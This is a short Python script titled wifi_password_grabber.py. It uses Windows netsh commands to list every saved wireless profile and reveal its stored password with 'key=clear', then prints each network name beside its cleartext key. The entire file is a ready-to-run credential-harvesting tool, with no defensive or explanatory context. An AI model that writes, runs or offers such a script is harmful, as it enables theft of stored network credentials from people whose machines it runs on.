# wifi_password_grabber.py
import subprocess

def get_wifi_passwords():
    result = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True, text=True)
    profiles = [line.split(":")[1].strip() for line in result.stdout.split("\n") if "All User Profile" in line]

    for profile in profiles:
        command = ["netsh", "wlan", "show", "profile", profile, "key=clear"]
        result = subprocess.run(command, capture_output=True, text=True)
        for line in result.stdout.split("\n"):
            if "Key Content" in line:
                password = line.split(":")[1].strip()
                print(f"[+] {profile}: {password}")
                break
        else:
            print(f"[-] {profile}: No password found")

get_wifi_passwords()
